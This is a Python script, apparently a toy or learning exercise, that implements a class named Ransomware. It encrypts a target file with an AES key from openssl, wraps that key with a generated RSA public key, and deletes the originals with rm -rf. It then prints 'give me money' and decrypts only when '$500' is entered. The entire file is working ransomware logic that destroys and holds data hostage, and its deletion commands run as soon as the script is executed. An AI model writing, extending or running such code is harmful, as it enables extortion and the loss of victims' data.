import subprocess
import sys
import os

KEY_FILE = "./key.txt"
CIPHER_KEY_FILE = "./key_cipher.txt"
SECRET_FILE = "./my_secrets.txt"
CIPER_DATA_FILE = "./data_cyper.txt"

class Ransomware:

    def __init__(self, key_file, ciper_key_file, secret_file, cipher_data_file):
        self.private_key = None
        self.public_key = None
        self.key_file = key_file
        self.ciper_key_file = ciper_key_file
        self.secret_file = secret_file
        self.cipher_data_file = cipher_data_file

    def self_print(self):
        print(f"key_file: {self.key_file}, cipher key file: {self.cipher_data_file}, secret file: {self.secret_file}, cipher data file: {self.cipher_data_file}")

    @staticmethod
    def run_command(cmd):
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        return result.stdout.strip()

    @staticmethod
    def generate_random_key():
        cmd = "openssl rand -base64 16"
        result = Ransomware.run_command(cmd)
        return result


    def generate_pair_key(self):
        gen_private_cmd = f"openssl genrsa 2048"
        self.private_key = Ransomware.run_command(gen_private_cmd)


        gen_public_cmd = f"echo \"{self.private_key}\" | openssl rsa -pubout"
        self.public_key = Ransomware.run_command(gen_public_cmd)

    def __encrypt_file(self):
        if not os.path.isfile(self.secret_file) or not os.path.isfile(self.key_file):
            raise FileNotFoundError(f"File not found (secret file or key file): {self.secret_file} {self.key_file}")

        cmd = f"openssl enc -aes-256-cbc -salt -in {self.secret_file} -out {self.cipher_data_file} -pass file:{self.key_file}"
        result = Ransomware.run_command(cmd)

    def __encrypt_symmetric(self, file_path, encrypted_file_path):
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
        if not self.public_key or not self.private_key:
            raise Exception("No public key or private key initialized!")

        temp_public_key_file = "./public.key"
        with open(temp_public_key_file, "w") as public_key_file:
            public_key_file.write(self.public_key)

        cmd = f"openssl rsautl -encrypt -pubin -inkey {temp_public_key_file} -in {file_path} -out {encrypted_file_path}"
        Ransomware.run_command(cmd)
        Ransomware.run_command(f"rm -rf {temp_public_key_file}")


    def __decrypt_symmetric(self, file_path, decrypted_file_path):
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
        if not self.public_key or not self.private_key:
            raise Exception("No public key or private key initialized!")

        temp_private_key_file = "./private.key"
        with open(temp_private_key_file, "w") as private_key_file:
            private_key_file.write(self.private_key)

        cmd = f"openssl rsautl -decrypt -inkey {temp_private_key_file} -in {file_path} -out {decrypted_file_path}"
        Ransomware.run_command(cmd)

        Ransomware.run_command(f"rm -rf {temp_private_key_file} {file_path}")

    def __decrypt_secrete(self):
        if not os.path.isfile(self.cipher_data_file) or not os.path.isfile(self.key_file):
            raise FileNotFoundError(f"File not found decrypt (cipher secrete file or key file): {self.cipher_data_file} {self.key_file}")
        cmd = f"openssl enc -d -aes-256-cbc -in {self.cipher_data_file} -out {self.secret_file} -pass file:{self.key_file}"
        Ransomware.run_command(cmd)
        Ransomware.run_command(f"rm -rf {self.cipher_data_file}")

    def delete_files(self):
        cmd = f"rm -rf {self.secret_file} {self.key_file}"
        Ransomware.run_command(cmd)

    def ransom(self):
        try:
            key = Ransomware.generate_random_key()
            with open(self.key_file, "w") as key_file:
                key_file.write(key)

            self.generate_pair_key()
            self.__encrypt_file()
            self.__encrypt_symmetric(self.key_file, self.ciper_key_file)

            self.delete_files()
        except Exception as e:
            print(f"Error: {e}")
            return

    def __reverse_ransom(self):
        self.__decrypt_symmetric(self.ciper_key_file, self.key_file)
        self.__decrypt_secrete()

    def run(self):
        try:
            self.ransom()
        except Exception as e:
            print(f"Error: {e}")
            return

        print("give me money")

        while True:
            try:
                line = input(f"HihiHaha: ")
                if (line == "$500"):
                    self.__reverse_ransom()
                    break
            except KeyboardInterrupt:
                return

def main():
    ransomware = Ransomware(KEY_FILE, CIPHER_KEY_FILE, SECRET_FILE, CIPER_DATA_FILE)
    ransomware.run()

main()